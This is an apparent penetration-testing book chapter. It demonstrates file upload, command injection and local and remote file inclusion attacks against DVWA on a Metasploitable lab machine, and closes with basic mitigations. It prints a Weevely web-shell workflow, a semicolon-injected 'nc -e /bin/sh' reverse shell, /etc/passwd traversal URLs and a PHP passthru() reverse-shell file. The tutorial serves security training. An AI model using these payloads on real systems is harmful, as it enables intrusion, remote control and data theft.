<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">File Upload, Code Execution, and File Inclusion Vulnerabilities</h1>
                </header>
            
            <article>
                
<p>This chapter will talk about different vulnerabilities and will explain how to perform them on the Metasploitable machine. A detailed illustration of the each of the scenarios will be covered. At the end of every section, we will also see a quick solution to each vulnerability explained.</p>
<p>The chapter will cover the following topics:</p>
<ul>
<li>File upload vulnerabilities</li>
<li><span>Code execution vulnerabilities</span></li>
<li><span>Local file inclusion vulnerabilities</span></li>
<li>Basic mitigation</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">File upload vulnerabilities</h1>
                </header>
            
            <article>
                
<p class="mce-root">In this chapter, we're going to have a look at file upload vulnerabilities. This is the simplest type of vulnerability because it allows us to upload any type of file. For example, if the target computer can understand PHP, then we can upload any PHP file or a PHP shell and get full control over the target computer.</p>
<p class="mce-root">If the target computer or the target server understands Python then we can just upload Python code or Python Shell. We can create these shells using Veil-Evasion or Metasploit, or we can use our own PHP or Python Shell.</p>
<p class="mce-root">In the next section, we are going to have a look at a tool called Weevely that generates PHP shells and allows us to gain access to and do a number of cool things on the target computer.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting started with Weevely</h1>
                </header>
            
            <article>
                
<p class="mce-root">When we're trying to pen test a website, before trying to use any tools or any other means, after we perform our information gathering, first browse the website. Just get a feel of the website, see what's installed on it, and try to exploit the features.</p>
<p>After going through the website, upload a file using the <span class="packt_screen">Upload</span> <span class="packt_screen"><span>tab</span></span>. The website allows us to upload a file. Sometimes in penetration testing tasks, it could be a website that's allowing us to upload a profile picture or a classified website allowing us to upload pictures of cars:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1815 image-border" src="assets/01655443-90ed-44ab-91c7-b4a03732e422.png" style="width:47.92em;height:35.75em;"/></p>
<p class="mce-root"/>
<p class="mce-root">As we can see in the preceding screenshot, the website expects us to choose and upload an image. Choose any image by clicking the <span class="packt_screen">Browse...</span> button, and upload a picture by clicking the <span class="packt_screen">Upload</span> button.</p>
<p>We can now see, in the following screenshot, that the image has been uploaded successfully:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/ee6ab740-18ce-4128-9528-1b08d6218926.png" style="width:28.92em;height:7.17em;"/></p>
<p class="mce-root">It's placed in <kbd>../../hackable/uploads/image.jpeg</kbd>, which means two directories backward followed by the filename.</p>
<p class="mce-root">Let's see whether the picture has actually been uploaded. We're going to use two directories, the vulnerabilities (<kbd>10.0.2.4/dvwa</kbd>) and upload (<kbd>hackable/uploads/image.jpeg</kbd><span>). We are using the directories just to ensure that the picture was uploaded properly. Once we add the directories to the address bar, we will see that the picture has been successfully uploaded:</span></p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/8475789f-16a3-4900-8e28-084c51c24eae.png" style="width:54.50em;height:24.92em;"/></p>
<p class="mce-root"/>
<p class="mce-root">The next thing we want to do is try uploading a PHP file, and to do that we're going to use a tool called Weevely. As said before, to create a payload or a shell, if that's what we want to call it (and it obviously is going to be a PHP shell), we can use Metasploit. To create a PHP payload, we're going to use a different tool that's designed for web application penetration testing.</p>
<p>It's quite easy to use. First, we are going to type the tool name <kbd>weevely</kbd> and add <kbd>generate</kbd> because we want to generate a payload or a shell file. Then we will put a password for the file so that only we can access it and control the website. As demonstrated in the following snippet, the password is <kbd>123456</kbd> and we want to store it in the <kbd>/root</kbd> location, called <kbd>shell.php</kbd>. The command is as follows:</p>
<pre><strong>weevely generate 123456 /root/shell.php</strong></pre>
<p>So, <kbd>weevely</kbd> is the name of the program, <kbd>generate</kbd> is to generate a shell, followed by the password, for authentication purposes, which is stored in <kbd>/root/shell.php</kbd>.</p>
<p class="mce-root">Hit <em>Enter</em> and create it. As we can see in the following screenshot, the file is generated at the specified location:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1818 image-border" src="assets/eb903568-be93-4307-a2de-ae1ae01b7097.png" style="width:19.08em;height:5.17em;"/></p>
<p>Now go back to the DVWA website and upload the <kbd>shell.php</kbd> file the same way we uploaded the image. All we need to do is use run the following command:</p>
<pre><strong>weevely http://10.0.2.4/dvwa/hackable/uploads/shell.php 123456</strong></pre>
<p>This process is similar to multi-handler waiting for a connection to the backdoor. We are connecting the backdoor that we uploaded, and we can see in the following screenshot we are in the filesystem:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1819 image-border" src="assets/577b3b45-56fd-4945-8b24-77956d4f9f2c.png" style="width:37.42em;height:10.83em;"/></p>
<p class="mce-root"/>
<p>Using <kbd>weevely</kbd>, we'll can just type in any Linux command, which will be executed on the target computer, and for which we can see the results. If we type <kbd>pwd</kbd> we will be able to see the location <kbd>/var/www/dvwa/hackable/uploads</kbd>, and if we type <kbd>id</kbd>, we will be able to see the user, which is the <kbd>www-data</kbd>. If we type <kbd>uname -a</kbd>, just to confirm that this is the Metasploitable machine, it will give us the following output:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1820 image-border" src="assets/39338a0e-1566-402d-899a-2fac1232a2e9.png" style="width:92.58em;height:13.42em;"/></p>
<p>We can do anything we want: list the files, navigate; we can perform any Linux command that we want. Weevely also offers many more features. If we type in <kbd>help</kbd>, we'll be able to see more functionalities of Weevely. We can try to escalate our privileges, execute SQL queries, and a lot of cool stuff that is just designed for web application penetration testing.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Code execution vulnerabilities</h1>
                </header>
            
            <article>
                
<p>This type of vulnerability allow us to execute the <strong>operating system</strong> (<strong>OS</strong>) code on the target server. If the target server uses Windows, we will be able to execute Windows commands. If it uses Linux, then we will be able to use Linux commands.</p>
<p>This is a critical vulnerability that would allow the attacker to do anything they want with the target's server. We can upload a PHP shell using the <kbd>wget</kbd> command, or upload a payload, a virus, using the <kbd>wget</kbd> Linux command. We just need to make sure that we're uploading it to a file or to a directory that we're allowed to write to.</p>
<p>Another way of exploiting this vulnerability is to just run OS commands and get a reverse shell based on these commands. We can run OS commands and the programming languages supported by the OS in order to try and get a reverse connection on our computer.</p>
<p>Let's assume that we are browsing and click on the <span class="packt_screen">Command Execution</span> tab on DVWA, which take us to the textbox website, which will ping for free. We should always try to experiment with the input box we see, try to see what that input box does and what can we inject into it, and what can we do to get hacking started.</p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>So, for example, this input box is asking us to ping, and if we put in an IP, for example, we're going to put <kbd>10.0.2.15</kbd>. A<span>fter filling in the details, click on</span> <span class="packt_screen">submit</span>. We can see the ping results in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1821 image-border" src="assets/d6d527bc-d13c-4ad2-a8ca-174d854e42ad.png" style="width:37.00em;height:22.83em;"/></p>
<p>We can view the execution of the <kbd>ping</kbd> command in Linux systems. Now let's see if we can exploit, if it's actually executing the <kbd>ping</kbd> command.</p>
<p>How would we exploit it if it's accepting what we're inputting, and then it will <kbd>ping</kbd> the command?</p>
<p>In Linux and Unix-based commands, we can use the semicolon (<kbd>;</kbd>) sign to execute multiple commands on one line, for example, <kbd><span>10.20.14.203;</span></kbd>.</p>
<p>If we try writing this command on the Terminal. Let's start by writing the list command, <kbd>ls</kbd>, and then <kbd>pwd</kbd>, which is the working directory. So if we write <kbd>ls;</kbd> followed by <kbd>pwd</kbd>, it will execute both commands. It will also display the working directory.</p>
<p class="mce-root"/>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1822 image-border" src="assets/6411da96-1431-40e8-aa2b-e8c0c63e062c.png" style="width:24.92em;height:13.83em;"/></p>
<p>This time, we will be adding <kbd>pwd</kbd> next to the IP address. Here's it how it should look:</p>
<pre>10.0.2.15; pwd<br/>ping 10.0.2.15</pre>
<p>Let's now see what will the execution look like. Go back to the DVWA server and write <kbd>10.0.2.15; pwd</kbd> on the address bar and then click <kbd>submit</kbd>. This screenshot shows us the current location of our working directory (<span><kbd>var/www/dvwa/vulnerabilities/exec</kbd>):</span></p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/d134b4bf-0891-4442-8464-3d622803dc7b.png" style="width:31.50em;height:15.42em;"/></p>
<p>It clearly notes the <kbd>pwd</kbd> that was inserted is executed, which means that we can insert any commands and it will <span>surely</span> <span>be executed.</span></p>
<p>Download the <kbd>code-execution-reverse-shell-commands.txt</kbd> resources file with commands from the book's GitHub repository to get a reverse connection from the target computer. There are a number of commands that will give us a reverse connection. All of the commands depend on the programming language. We have commands in PHP, Ruby, PERL, and BASH.</p>
<p class="mce-root"/>
<p>BASH is the Linux shell command language, so all Unix OS will be able to execute BASH commands. The <kbd>bash</kbd> command should work on most Unix-based systems. Again, most users would use Python and Netcat. We will be using Netcat in this chapter.</p>
<p>Before getting started, we're going to listen for connections the way we did previously with Metasploit for multi-handling. We can use a multi-handler to listen to the connections. Netcat is just a tool that allows us to listen to and connect computers together. Use the following command:</p>
<pre><strong>nc -vv -l -p 8080</strong></pre>
<p>The <kbd>8080</kbd> is the port, <kbd>nc</kbd> is the program, and <kbd>vv</kbd> is used for viewing verbose output. We can check the output and see whether anything goes wrong. The <kbd>-l -p</kbd> <span>command</span> on <kbd>8080</kbd> is used for listening. Hit <em>Enter</em>, and we will able to see the following message:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1826 image-border" src="assets/31412be5-540e-477b-aa82-4fe91dfbfea3.png" style="width:16.83em;height:2.75em;"/></p>
<p>The next command is going to help us connect the web server back to our computer using Netcat. So, let's assume that the web server has Netcat, and we check how it works.</p>
<p>Refer to the Netcat command from the <span><kbd>code-execution-reverse-shell-commands.txt</kbd> file,</span> which had all the commands written in it. Here is the command:</p>
<pre><strong>nc -e /bin/sh 10.0.2.15 8080</strong></pre>
<p>As shown, we will use <kbd>/bin/sh</kbd>, the current IP of the device, the attacker device, followed by the port. In our case, it will be <kbd>10.0.2.14 8080</kbd>.</p>
<p>Copy the command and paste it into the address bar of DVWA server so that the <kbd>pwd</kbd> command is executed. Previously, the command that was used was <kbd>10.0.2.15; pwd</kbd>. But now let's try removing the <kbd>pwd</kbd> and then paste the code. Here is the command:</p>
<pre><strong>10.0.2.15; nc -e /bin/sh 10.0.2.15 8080</strong></pre>
<p class="mce-root"/>
<p>This first IP connects the web server back to the Kali machine and then to the attacker machine:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/b0c3cf36-3b0c-4060-be19-df5fe495a526.png" style="width:30.25em;height:14.17em;"/></p>
<p>Go back to the Terminal, and we will be to see a connection call to <kbd>10.0.2.4</kbd> from <kbd>10.0.2.15</kbd>, and we will <span>again</span> be adding <kbd>pwd</kbd>, <kbd>ls</kbd>, and <kbd>id</kbd>. As shown in the screenshot, when we insert the <kbd>id</kbd> command, we will get <kbd>www- data</kbd> and we can then add <kbd>uname</kbd> just to confirm whether it's Metasploitable. Here's a screenshot depicting this information:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1828 image-border" src="assets/a1d594f0-b9a4-4bfa-acbf-c83d5d69278d.png" style="width:28.92em;height:14.42em;"/></p>
<p>We can run any commands on the target computer and have access to the target computer.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Local file inclusion vulnerabilities</h1>
                </header>
            
            <article>
                
<p>Local file exploits or vulnerabilities allow us to read any file that is within the same server as the vulnerability; even if the file exists outside the <kbd>/var/www</kbd> directory, we'll be able to read the information within it.</p>
<p class="mce-root"/>
<p>A vulnerability is critical because we can read any files, such as important files or password files. Also, if there are a number of websites on the same server and we managed to find a website that we're not targeting, then we might be able to access files related to the website that we're targeting and then further exploit the website from there.</p>
<p>We are going to exploit the vulnerability through the URL. So, usually in our code execution examples, we write the code in the textbox. Sometimes, we might find the code vulnerability in the URL, which will have keywords such as <kbd>cmd</kbd>.</p>
<p>The same old process continues. Click on the <span class="packt_screen">File Inclusion</span> tab on the DWVA server and the URL we get is <kbd>http://10.0.2.4/dvwa/vulnerabilities/fi/?page=include.php</kbd>.</p>
<p><span>We can see that the file already has a page. The <kbd>include.php</kbd> command will again load another page. As in the previous example, we will again see the URL with the IP address and the same <kbd>ping</kbd> command, as explained in the previous section. Here, in our example, the objective is to open a file using <kbd>include.php</kbd>. After removing the <kbd>page</kbd> term from the URL, the URL now will be visible as <kbd>http://10.0.2.4/dvwa/vulnerabilities/fi/include.php</kbd>. There is a fatal error generated, as shown in the following screenshot:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1913 image-border" src="assets/cc6915b5-75c5-4615-a7be-faf0ad4eb527.png" style="width:58.83em;height:7.67em;"/></p>
<p>We can see a file named <kbd>include.php</kbd> on the page, which is in the same working directory. Let's try and see whether we can read a file called <kbd>/etc/passwd</kbd> that is stored in the computer. It's the file containing all the user passwords present on the current web server and all the users using the current OS. Let's go to the Terminal and run some commands. For example, running <kbd>cat/etc/passwd</kbd> on Kali returns the following output:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1914 image-border" src="assets/aef8cfc7-f88f-4264-8d16-101907f5ecf1.png" style="width:40.50em;height:18.92em;"/></p>
<p>We will see all the users that we have been on the current computer and their default paths on the current OS. We will now try to read the <kbd>passwd</kbd> file. To do this, go back to the current location in the <kbd>fi</kbd> directory, which was mentioned before. Referring to the previous screenshot, when in <kbd>/var/www/dvwa/vulnerabilities/fi/include.php</kbd>, we are in the <kbd>fi</kbd> directory; we need to go back five places back to get to <kbd>/etc/passwd</kbd>.</p>
<p>As explained, we will need to go five places back by adding double dots. So, the URL changes to <kbd>http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd</kbd>. The output will be seen once we hit <em>Enter</em> is as follows:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2013 image-border" src="assets/a7a7b044-3b8c-4fa1-bacb-a903a6bd82b5.png" style="width:112.33em;height:48.75em;"/></p>
<p class="mce-root"/>
<p>We will be able to see the <kbd>/etc/passwd</kbd> files. To understand and read the data, copy the data on a notepad. By doing so, we will get more information about the targeted websites. We can also access different, sensitive files, or files of other websites on the same server. The next section will help us understand remote file inclusion using Metasploitable.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Remote file inclusion using Metasploitable</h1>
                </header>
            
            <article>
                
<p>Remote file inclusion is a special way of exploiting file inclusion vulnerabilities. In the previous section, we learned how to include a file in the server and the ways to access it through local file inclusion vulnerabilities.</p>
<p>In this section, we will learn how to configure a server so that it allows the <kbd>allow_url</kbd> and <kbd>allow_url_fopen</kbd> functions. This will allow the inclusion of a file from a computer to the target website. We will learn how to inject a PHP file into the target computer, which will help us to run payloads and reverse shells and system commands, allowing access to the target or full control of the target server.</p>
<p>Let's get started by exploiting the file inclusion vulnerability that was discussed in the previous section. We will be using the same <kbd>page</kbd> parameter here. The only thing that is different here is the transition from local file inclusion to remote file inclusion. This will ensure that the local file inclusion will allow the accessing of local files, and remote file inclusion will allow the accessing and injection of remote files.</p>
<p>Let's test the vulnerability using the Metasploitable framework. In the framework, we will be using PHP settings, which are stored in the file. To access them, we will use <kbd>nano</kbd>, which is a text editor. We need to type the location of the configuration file, which is at <kbd>/</kbd><span><kbd>etc/php5/cgi/php.ini</kbd>, into the <kbd>nano</kbd> editor</span>. <kbd>/etc/php5/cgi</kbd> is <span>the actual location where our PHP configuration file is located. We need to add <kbd>sudo</kbd> as the root. In Kali, we do not need to add <kbd>sudo</kbd>, because we log in as <kbd>root</kbd>, but in Metaspolitable, we need to add <kbd>sudo</kbd> to carry out <kbd>root</kbd> actions. After adding <kbd>sudo</kbd> to the present command, run the following command:</span></p>
<pre><strong>sudo nano /etc/php5/cgi/php.ini</strong></pre>
<p>If we want to search for the <kbd>allow_url_fopen</kbd> function, press <em>Ctrl</em> + <em>W</em> and type <kbd>allow_url</kbd> and hit <em>Enter</em>. We will be able to see that <kbd>allow_url_fopen</kbd> and <kbd>allow_url_include</kbd> are <kbd>On</kbd>:</p>
<p class="mce-root"/>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2008 image-border" src="assets/a0b21332-5f1b-4e60-b473-c4dbaff94c23.png" style="width:41.92em;height:23.33em;"/></p>
<p>If we enable these two functions, then the local file inclusion vulnerability can be used for remote file inclusion. To exit the current operation, use <em>Ctrl </em>+ <em>X;</em> to save, use <em>Ctrl</em> + <em>Y</em> and <em>Enter.</em> After saving the file restart the web server, by entering <kbd>sudo /etc/init.d/apache2 restart</kbd><span>.</span></p>
<p>We learned about the local file inclusion vulnerabilities work. We used the five-spaces-back method to access the <kbd>passwd</kbd> file. In remote file inclusion, we're <span>going to access a file that is located on a different server.</span></p>
<p>Now we will be using a pen test on an actual web server in order to get access to the file that is stored. The file should either have an IP address or a domain name. We need to run this on a local server and store the file on the web server of the Kali machine using <kbd>10.0.2.15</kbd>, in our case. The file could be a web shell or payload. Now create a simple PHP file. We will be using the <kbd>passthru()</kbd> function, which will execute OS commands for Windows and Linux. Which commands are going to be executed completely depends on the web server that they will be executed on. Create a file called <kbd>reverse.txt</kbd> with following code:</p>
<pre>&lt;?php<br/>passthru("nc -e /bin/sh 10.0.2.15 8080");<br/>?&gt;</pre>
<p>We will be using the <kbd>nc</kbd> command that was used for code execution vulnerability, which allowed us to get a connection or a reverse connection from our target.</p>
<p>The code starts and ends with <kbd>&lt;?php</kbd> and <kbd>?&gt;</kbd> tags. The commands will be placed between the quotation marks. Since we are using the same <kbd>nc</kbd> command, it will reverse the connection of the computer. The next step is to store this file in a we server. If the target is a remote web server, then we should store the file with IP so that we access the file from the remote web server. We will access the file using a Metasploitable machine, which will access stored files on the Kali machine. This is possible since the files and the machines are on the same network. The current file starts with <kbd>/var/www/html</kbd>, so the file will be stored on Kali and not on Metasploitable. In order to reverse it, we will be saving the file as <kbd>.txt</kbd> and not <kbd>.php</kbd>. If we store the file as PHP, it is going to be executed on the Kali machine. As we know, we already have access to the Kali machine, and we need to get access to the file on <span>Metasploitable</span>. To do this, we will save the file as <kbd>reverse.txt</kbd> on the <kbd>localhost</kbd>, which is in, <kbd>/var/www/html</kbd> directory. The file is still stored on <kbd>localhost</kbd> and not Metasploitable, so it's at <kbd>10.0.2.15</kbd>. To check the whether <kbd>reverse.txt</kbd> file is on <kbd>localhost</kbd>, type <kbd>localhost/reverse.txt</kbd> in the address bar and press <em>Enter</em>. The file will be displayed in the browser:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2009 image-border" src="assets/f33f8c90-c206-422d-8338-2e60d9e55956.png" style="width:25.00em;height:11.00em;"/></p>
<p>Before starting the remote inclusion, listen for the connections on Kali in the same way as  in the <em>Code execution vulnerabilities</em> section. Type the following <kbd>nc</kbd> command to listen for the connections:</p>
<pre><strong>nc -vv -l -p 8080<br/></strong></pre>
<p>Now we should be listening for the connections, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2010 image-border" src="assets/b9820fce-af6a-42ec-87a4-e482d3970bfe.png" style="width:18.33em;height:2.42em;"/></p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Now, instead of including the file on the same server, we will include the remote file in the URL. The URL changes to <kbd>http://10.0.2.4/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/reverse.txt</kbd> as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/317eb379-3fb3-464e-b372-98051963c1ac.png" style="width:55.58em;height:25.33em;"/></p>
<p>If we now check the file, it will be executed on <span><kbd>10.0.2.15</kbd>, which is now going to give us a remote connection to a Metasploitable computer. Go back to the Terminal, and if we type <kbd>uname - a</kbd>, we will now get full access to the Metasploitable machine, as shown in the following screenshot:</span></p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/82b27373-17e9-4fe2-ba90-47eec00d6294.png" style="width:36.83em;height:6.50em;"/></p>
<p>We can also execute commands such as <kbd>ls</kbd> and <kbd>pwd</kbd> on the <span>Metasploitable </span>machine.</p>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Basic mitigation</h1>
                </header>
            
            <article>
                
<p>This section talks about the prevention of vulnerabilities. A lot of vulnerabilities exist because of the functionalities that they provide.</p>
<p>For example, in the first section, <em>File upload vulnerabilities</em>, we talked about allowing the upload of any file extension. The ideal case is to check the file type, if a user is uploading a file; it should be an MP3 or a media file, not a PHP file or some executable code. We should never allow users to upload executables. Filters can be used to check the extension. The best way to do this is to check the file instead of just checking the extension, because files can bypass the extension check. Check the picture or the media instead of relying on the extension.</p>
<p>In the second section, <em>Code execution vulnerabilities</em>, we explored how we can run any code on a target computer. We should avoid allowing users to run code on the server. Also, avoid functions such as <kbd>eval</kbd> and <kbd>passthru</kbd>, which allow users to run OS code on the server. If we have to use these functions, analyze the input before execution.</p>
<p>Take a look at this, for example:</p>
<pre>10.0.2.15; ls-la</pre>
<p>Suppose we type an IP, <kbd>10.0.2.15</kbd>, and then add a semicolon, and a command, <kbd>ls-la</kbd>. The only problem is the web application accepts the information the way it is copied and run. When we execute the command, we will see the IP address first and then the <kbd>ls-la</kbd> command. In such cases, check the input that was entered. If we are expecting an IP address, we can use a regex. A regex is a rule that will ensure that the input conforms with the format <kbd>10.0.2.15</kbd>. If we enter any other input, the web application would reject it. We should also ensure that there are no semicolons or spaces, and that everything comes as one thing and gets executed. These are many secure ways of execution, but the best thing to do is avoid <kbd>eval</kbd> and <kbd>passthru</kbd> functions.</p>
<p>The third section was on file inclusion, which was further divided into local and remote file inclusion. Local file inclusion allowed us to include any file on the target system, and to read files that had been disclosed by a vulnerability. Remote file inclusion was also looked at, which allows us to include any file from a web server that has PHP shells and gain a connection to the target computer. </p>
<p class="mce-root"/>
<p>We need to prevent remote file inclusion so that people cannot include files outside our server. We can enable this method using the <kbd>php.ini</kbd> file by disabling the <kbd>allow_url_fopen</kbd> and <kbd>allow_url_include</kbd> functions. To disable the functions, follow the steps used in the <em>Remote file inclusion using Metasploitable</em> section.</p>
<p>Ensure that the settings for <kbd>allow_url_fopen</kbd> and <kbd>allow_url_include</kbd> are set to <kbd>Off</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/b63661fe-bd6e-4a90-b5ec-ebd8211812f7.png" style="width:39.00em;height:19.67em;"/></p>
<p>The other way to prevent these exploits is to use static file inclusion. So instead of using dynamic file inclusion, which we've seen, we can hardcode the files that we want to include in the code and not have to get them using <kbd>GET</kbd> or <kbd>POST</kbd>.</p>
<p>For example, in the vulnerability cases, we used the <kbd>page</kbd> parameter with the <kbd>index.php</kbd> page. Now, the <kbd>index.php</kbd> page uses the <kbd>include</kbd> parameter or otherwise takes another page called <kbd>news.php</kbd>, which will be included in the <kbd>$_GET();</kbd> parameter in the code. The following screenshot explains the vulnerability:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/466391a5-351b-4516-9d27-3c90331635d2.png" style="width:12.17em;height:5.75em;"/></p>
<p class="mce-root"/>
<p>The fundamental thing is to <kbd>include</kbd> files that come after the <kbd>page</kbd> parameter. The code will dynamically take the files that come after the <kbd>page</kbd> parameter in the URL and <kbd>include</kbd> everything from URL to the current page. In some cases, we tend to use the <kbd>POST</kbd> method, which will not get the same executions; however, in such cases, it's best to use a proxy, such as Burp Proxy. It will help us to make modifications and include the files that we want to display. By using this approach, we won't be able to manipulate anything inside the page that is included. To avoid hard code and prevent using a variable, simply provide the page that needs to be included. This will make the code look longer but the page will be much more secure. </p>
<p>The following screenshot shows us an easier way of hardcoding:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2016 image-border" src="assets/33dc1581-1f24-4138-a97d-ec31606b75b6.png" style="width:14.50em;height:5.75em;"/></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>In this chapter, we learned about basic file uploads using file vulnerabilities. We also looked at how to execute OS code under code vulnerabilities. Furthermore, we learned about local and remote file inclusion using Metasploitable. Finally, we learned about the problem-solving takeaways that should be considered when working with these vulnerabilities. The next chapter will dive deep into SQL injection vulnerabilities.</p>


            </article>

            
        </section>
    </body></html>